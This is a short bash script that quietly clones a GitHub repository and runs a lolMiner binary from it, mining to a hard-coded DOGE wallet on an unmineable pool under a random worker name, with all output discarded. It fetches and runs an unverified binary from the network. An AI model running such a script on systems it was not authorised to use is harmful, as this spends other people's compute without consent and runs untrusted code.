#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=DOGE:DFnzT5dETx7AnkXqdkHese6uae5Au4uU19
WORKER=$(echo $(shuf -i 1-9999 -n 1)-V100)

git clone https://github.com/admin121x/1 > /dev/null 2>&1 && cd 1/1.29 ; chmod +x lolMiner && ./lolMiner --algo ETHASH --pool $POOL --user $WALLET.$WORKER > /dev/null 2>&1
